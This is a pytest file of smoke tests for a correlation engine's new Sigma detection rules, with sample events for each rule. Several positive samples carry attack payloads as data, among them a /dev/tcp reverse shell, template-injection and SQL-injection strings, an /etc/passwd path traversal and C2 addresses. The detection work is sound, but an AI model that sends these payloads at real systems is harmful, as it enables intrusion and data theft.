"""Smoke tests for v1.6.3 detection rules (26 new sigma rules from Jun 2026 threat intel)."""
import pytest

from app.services.correlation_engine import correlation_engine


def test_sigma_web_jce_joomla_rce_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.10', 'path': '/index.php?option=com_jce&task=profiles.import', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_jce_joomla_rce" in rule_ids, f"expected sigma_web_jce_joomla_rce to match, got {rule_ids}"

def test_sigma_web_jce_joomla_rce_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.10', 'path': '/index.php?option=com_content&view=article&id=1', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_jce_joomla_rce" not in rule_ids, f"sigma_web_jce_joomla_rce false-positived on benign event"

def test_sigma_web_mirasvit_cachewarmer_deser_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.11', 'path': '/checkout/cart Cookie: CacheWarmer=TzO0NTpcyM2', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_mirasvit_cachewarmer_deser" in rule_ids, f"expected sigma_web_mirasvit_cachewarmer_deser to match, got {rule_ids}"

def test_sigma_web_mirasvit_cachewarmer_deser_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.11', 'path': '/checkout/cart Cookie: PHPSESSID=abc123', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_mirasvit_cachewarmer_deser" not in rule_ids, f"sigma_web_mirasvit_cachewarmer_deser false-positived on benign event"

def test_sigma_web_ivanti_sentry_cmdinject_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.12', 'path': '/mics/api/v2/sentry/mics-config/handleMessage?cmd=commandexec', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_ivanti_sentry_cmdinject" in rule_ids, f"expected sigma_web_ivanti_sentry_cmdinject to match, got {rule_ids}"

def test_sigma_web_ivanti_sentry_cmdinject_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.12', 'path': '/mics/api/v2/sentry/status', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_ivanti_sentry_cmdinject" not in rule_ids, f"sigma_web_ivanti_sentry_cmdinject false-positived on benign event"

def test_sigma_ai_litellm_mcp_cmdinject_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.13', 'path': '/mcp-rest/test/connection {"transport":"stdio","command":"sh"}', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_litellm_mcp_cmdinject" in rule_ids, f"expected sigma_ai_litellm_mcp_cmdinject to match, got {rule_ids}"

def test_sigma_ai_litellm_mcp_cmdinject_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.13', 'path': '/mcp-rest/test/connection {"transport":"sse"}', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_litellm_mcp_cmdinject" not in rule_ids, f"sigma_ai_litellm_mcp_cmdinject false-positived on benign event"

def test_sigma_web_splunk_postgres_recovery_rce_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.14', 'path': '/en-US/splunkd/__raw/v1/postgres/recovery/backup', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_splunk_postgres_recovery_rce" in rule_ids, f"expected sigma_web_splunk_postgres_recovery_rce to match, got {rule_ids}"

def test_sigma_web_splunk_postgres_recovery_rce_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.14', 'path': '/en-US/splunkd/__raw/v1/data/inputs', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_splunk_postgres_recovery_rce" not in rule_ids, f"sigma_web_splunk_postgres_recovery_rce false-positived on benign event"

def test_sigma_ai_marimo_terminal_rce_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.15', 'path': '/terminal/ws', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_marimo_terminal_rce" in rule_ids, f"expected sigma_ai_marimo_terminal_rce to match, got {rule_ids}"

def test_sigma_ai_marimo_terminal_rce_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.15', 'path': '/notebook/ws', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_marimo_terminal_rce" not in rule_ids, f"sigma_ai_marimo_terminal_rce false-positived on benign event"

def test_sigma_ai_sglang_rerank_ssti_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.16', 'path': "/v1/rerank {{__import__('os').system('id')}}", 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_sglang_rerank_ssti" in rule_ids, f"expected sigma_ai_sglang_rerank_ssti to match, got {rule_ids}"

def test_sigma_ai_sglang_rerank_ssti_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.16', 'path': '/v1/rerank {"query":"hello","documents":["doc1"]}', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_sglang_rerank_ssti" not in rule_ids, f"sigma_ai_sglang_rerank_ssti false-positived on benign event"

def test_sigma_supply_mastra_easyday_c2_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.5', 'destination_ip': '23.254.164.92', 'destination_port': 8000})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_mastra_easyday_c2" in rule_ids, f"expected sigma_supply_mastra_easyday_c2 to match, got {rule_ids}"

def test_sigma_supply_mastra_easyday_c2_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.5', 'destination_ip': '1.1.1.1', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_mastra_easyday_c2" not in rule_ids, f"sigma_supply_mastra_easyday_c2 false-positived on benign event"

def test_sigma_supply_nodeipc_azure_c2_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.6', 'destination_ip': '37.16.75.69', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_nodeipc_azure_c2" in rule_ids, f"expected sigma_supply_nodeipc_azure_c2 to match, got {rule_ids}"

def test_sigma_supply_nodeipc_azure_c2_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.6', 'destination_ip': '13.107.42.14', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_nodeipc_azure_c2" not in rule_ids, f"sigma_supply_nodeipc_azure_c2 false-positived on benign event"

def test_sigma_supply_shai_hulud_miasma_anthropic_spoof_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.7', 'path': 'POST api.anthropic.com/v1/api', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_shai_hulud_miasma_anthropic_spoof" in rule_ids, f"expected sigma_supply_shai_hulud_miasma_anthropic_spoof to match, got {rule_ids}"

def test_sigma_supply_shai_hulud_miasma_anthropic_spoof_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.7', 'path': 'POST api.anthropic.com/v1/messages', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_shai_hulud_miasma_anthropic_spoof" not in rule_ids, f"sigma_supply_shai_hulud_miasma_anthropic_spoof false-positived on benign event"

def test_sigma_supply_solana_fakefix_telegram_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.8', 'path': 'POST api.telegram.org/bot12345:ABC/sendMessage', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_solana_fakefix_telegram" in rule_ids, f"expected sigma_supply_solana_fakefix_telegram to match, got {rule_ids}"

def test_sigma_supply_solana_fakefix_telegram_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.8', 'path': 'GET api.github.com/repos/user/repo', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_solana_fakefix_telegram" not in rule_ids, f"sigma_supply_solana_fakefix_telegram false-positived on benign event"

def test_sigma_network_fortibleed_ioc_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '85.11.187.8', 'destination_ip': '100.87.222.58', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_fortibleed_ioc" in rule_ids, f"expected sigma_network_fortibleed_ioc to match, got {rule_ids}"

def test_sigma_network_fortibleed_ioc_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '200.1.1.1', 'destination_ip': '100.87.222.58', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_fortibleed_ioc" not in rule_ids, f"sigma_network_fortibleed_ioc false-positived on benign event"

def test_sigma_ai_litellm_bearer_sqli_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.17', 'path': "/chat/completions Authorization: Bearer abc'OR'1'='1", 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_litellm_bearer_sqli" in rule_ids, f"expected sigma_ai_litellm_bearer_sqli to match, got {rule_ids}"

def test_sigma_ai_litellm_bearer_sqli_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.17', 'path': '/chat/completions Authorization: Bearer sk-abc123validtoken', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ai_litellm_bearer_sqli" not in rule_ids, f"sigma_ai_litellm_bearer_sqli false-positived on benign event"

def test_sigma_web_nextjs_ws_ssrf_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.18', 'path': 'GET http://internal.local/admin Upgrade: websocket', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_nextjs_ws_ssrf" in rule_ids, f"expected sigma_web_nextjs_ws_ssrf to match, got {rule_ids}"

def test_sigma_web_nextjs_ws_ssrf_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.18', 'path': '/api/users', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_nextjs_ws_ssrf" not in rule_ids, f"sigma_web_nextjs_ws_ssrf false-positived on benign event"

def test_sigma_web_ghost_content_api_sqli_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.19', 'path': '/ghost/api/v3/content/posts?filter=slug:[UNION SELECT 1,2,3--]', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_ghost_content_api_sqli" in rule_ids, f"expected sigma_web_ghost_content_api_sqli to match, got {rule_ids}"

def test_sigma_web_ghost_content_api_sqli_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.19', 'path': '/ghost/api/v3/content/posts?filter=tag:news', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_ghost_content_api_sqli" not in rule_ids, f"sigma_web_ghost_content_api_sqli false-positived on benign event"

def test_sigma_supply_shai_hulud_hades_firedalazer_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.9', 'path': 'github.com/search/commits?q=firedalazer', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_shai_hulud_hades_firedalazer" in rule_ids, f"expected sigma_supply_shai_hulud_hades_firedalazer to match, got {rule_ids}"

def test_sigma_supply_shai_hulud_hades_firedalazer_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.9', 'path': 'github.com/search/commits?q=fix+bug', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_shai_hulud_hades_firedalazer" not in rule_ids, f"sigma_supply_shai_hulud_hades_firedalazer false-positived on benign event"

def test_sigma_ransomware_prinz_eugen_ext_positive():
    matches = correlation_engine.evaluate({'event_type': 'file_create', 'source_ip': '10.0.0.10', 'file_path': '/home/user/Documents/report.docx.prinzeugen'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ransomware_prinz_eugen_ext" in rule_ids, f"expected sigma_ransomware_prinz_eugen_ext to match, got {rule_ids}"

def test_sigma_ransomware_prinz_eugen_ext_negative():
    matches = correlation_engine.evaluate({'event_type': 'file_create', 'source_ip': '10.0.0.10', 'file_path': '/home/user/Documents/report.docx'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ransomware_prinz_eugen_ext" not in rule_ids, f"sigma_ransomware_prinz_eugen_ext false-positived on benign event"

def test_sigma_ransomware_shinysp1d3r_ext_positive():
    matches = correlation_engine.evaluate({'event_type': 'file_create', 'source_ip': '10.0.0.11', 'file_path': '/vmfs/volumes/datastore1/vm.vmdk.shinysp1d3r'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ransomware_shinysp1d3r_ext" in rule_ids, f"expected sigma_ransomware_shinysp1d3r_ext to match, got {rule_ids}"

def test_sigma_ransomware_shinysp1d3r_ext_negative():
    matches = correlation_engine.evaluate({'event_type': 'file_create', 'source_ip': '10.0.0.11', 'file_path': '/vmfs/volumes/datastore1/vm.vmdk'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_ransomware_shinysp1d3r_ext" not in rule_ids, f"sigma_ransomware_shinysp1d3r_ext false-positived on benign event"

def test_sigma_web_schneider_saitel_path_traversal_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.20', 'path': '/saitel/config/../../../etc/passwd', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_schneider_saitel_path_traversal" in rule_ids, f"expected sigma_web_schneider_saitel_path_traversal to match, got {rule_ids}"

def test_sigma_web_schneider_saitel_path_traversal_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.20', 'path': '/saitel/status', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_schneider_saitel_path_traversal" not in rule_ids, f"sigma_web_schneider_saitel_path_traversal false-positived on benign event"

def test_sigma_web_aver_ptc_cgi_rce_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.21', 'path': '/cgi-bin/upload.cgi?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_aver_ptc_cgi_rce" in rule_ids, f"expected sigma_web_aver_ptc_cgi_rce to match, got {rule_ids}"

def test_sigma_web_aver_ptc_cgi_rce_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.21', 'path': '/cgi-bin/status.cgi', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_aver_ptc_cgi_rce" not in rule_ids, f"sigma_web_aver_ptc_cgi_rce false-positived on benign event"

def test_sigma_web_panos_globalprotect_bypass_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.22', 'path': '/ssl-vpn/hipreport.esp', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_panos_globalprotect_bypass" in rule_ids, f"expected sigma_web_panos_globalprotect_bypass to match, got {rule_ids}"

def test_sigma_web_panos_globalprotect_bypass_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.22', 'path': '/global-protect/login.esp', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_panos_globalprotect_bypass" not in rule_ids, f"sigma_web_panos_globalprotect_bypass false-positived on benign event"

def test_sigma_network_checkpoint_qilin_c2_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '45.77.149.152', 'destination_ip': '100.87.222.58', 'destination_port': 500})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_checkpoint_qilin_c2" in rule_ids, f"expected sigma_network_checkpoint_qilin_c2 to match, got {rule_ids}"

def test_sigma_network_checkpoint_qilin_c2_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '1.2.3.4', 'destination_ip': '100.87.222.58', 'destination_port': 500})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_checkpoint_qilin_c2" not in rule_ids, f"sigma_network_checkpoint_qilin_c2 false-positived on benign event"

def test_sigma_network_ayysshush_asus_c2_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '101.99.91.151', 'destination_ip': '100.87.222.58', 'destination_port': 22})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_ayysshush_asus_c2" in rule_ids, f"expected sigma_network_ayysshush_asus_c2 to match, got {rule_ids}"

def test_sigma_network_ayysshush_asus_c2_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '8.8.8.8', 'destination_ip': '100.87.222.58', 'destination_port': 22})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_network_ayysshush_asus_c2" not in rule_ids, f"sigma_network_ayysshush_asus_c2 false-positived on benign event"

def test_sigma_supply_axios_sfrclak_c2_positive():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.12', 'destination_ip': '142.11.206.73', 'destination_port': 8000})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_axios_sfrclak_c2" in rule_ids, f"expected sigma_supply_axios_sfrclak_c2 to match, got {rule_ids}"

def test_sigma_supply_axios_sfrclak_c2_negative():
    matches = correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.12', 'destination_ip': '104.16.0.1', 'destination_port': 443})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_supply_axios_sfrclak_c2" not in rule_ids, f"sigma_supply_axios_sfrclak_c2 false-positived on benign event"

def test_sigma_web_cpanel_whm_crlf_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.23', 'path': '/login Cookie: whostmgrsession=abc\\r\\nSet-Cookie: evil=1', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_cpanel_whm_crlf" in rule_ids, f"expected sigma_web_cpanel_whm_crlf to match, got {rule_ids}"

def test_sigma_web_cpanel_whm_crlf_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.23', 'path': '/login Cookie: whostmgrsession=abc123def456', 'method': 'POST'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_cpanel_whm_crlf" not in rule_ids, f"sigma_web_cpanel_whm_crlf false-positived on benign event"

def test_sigma_web_drupal_jsonapi_sqli_positive():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.24', 'path': '/jsonapi/node/article?filter[title]=UNION SELECT pg_sleep(5)', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_drupal_jsonapi_sqli" in rule_ids, f"expected sigma_web_drupal_jsonapi_sqli to match, got {rule_ids}"

def test_sigma_web_drupal_jsonapi_sqli_negative():
    matches = correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.24', 'path': '/jsonapi/node/article?filter[title]=hello-world', 'method': 'GET'})
    rule_ids = [getattr(m, "rule_id", None) for m in matches]
    assert "sigma_web_drupal_jsonapi_sqli" not in rule_ids, f"sigma_web_drupal_jsonapi_sqli false-positived on benign event"
